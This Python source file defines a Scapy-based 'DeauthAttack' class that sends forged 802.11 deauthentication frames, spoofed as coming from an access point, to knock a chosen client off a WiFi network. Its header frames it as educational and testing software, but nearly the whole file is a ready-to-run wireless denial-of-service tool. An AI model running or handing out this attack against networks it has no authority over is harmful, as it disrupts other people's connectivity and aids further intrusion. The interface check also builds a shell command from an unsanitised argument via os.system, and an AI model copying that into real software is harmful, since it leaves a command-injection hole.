
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# -----------------------------------------------------------------------------
# /**
#  * @file deauth.py
#  * @author Oscar Gomez Fuente <oscargomezf@gmail.com>
#  * @modified Oscar Gomez Fuente <oscargomezf@gmail.com>
#  * @date 2025-06-23 17:39:37 
#  * @version 1.1
#  * @section DESCRIPTION
#  *     This Python script is part of a custom library designed to perform
#  *     WiFi Deauthentication (DeAuth) attacks using the Scapy framework. The
#  *     script allows the user to craft and send IEEE 802.11 deauthentication
#  *     frames to forcibly disconnect a target device from a specified WiFi
#  *     access point (AP).
#  *     The script defines a DeauthAttack class that:
#  *         - Builds deauthentication packets spoofing the AP's MAC address.
#  *         - Sends a configurable number of deauthentication frames to a
#  *           selected client device at a specified interval.
#  *         - Includes a safety check to ensure the selected network interface
#  *           is in monitor mode.
#  *
#  *     It provides a simple, programmable interface to automate WiFi
#  *     deauthentication attacks for educational, research, and controlled
#  *     testing purposes.
#  *
#  *     Required packages: scapy, colorama, print_helper_logger
#  *     Install with: pip install scapy colorama print_helper_logger
#  */
# -----------------------------------------------------------------------------

import os
from scapy.all import Dot11, RadioTap, Dot11Deauth, sendp
from print_helper_logger import Print_Helper, Severity_Level

class DeauthAttack:
	def __init__(self, ph, interface, target_mac, ap_mac, count=1000, interval=0.1):
		self.ph = ph
		self.interface = interface
		self.target_mac = target_mac
		self.ap_mac = ap_mac
		self.count = count
		self.interval = interval

	def run(self):
		dot11 = Dot11(addr1=self.target_mac, addr2=self.ap_mac, addr3=self.ap_mac)
		frame = RadioTap()/dot11/Dot11Deauth(reason=7)

		self.ph.print_inf(f"Sending {self.count} DeAuth packets to {self.target_mac} from {self.ap_mac}\n")
		sendp(frame, iface=self.interface, count=self.count, inter=self.interval, verbose=1)

	@staticmethod
	def check_interface(interface):
		result = os.system(f"iwconfig {interface} | grep 'Mode:Monitor' > /dev/null")
		if result != 0:
			raise Exception(f"The interface {interface} is not in monitor mode.")
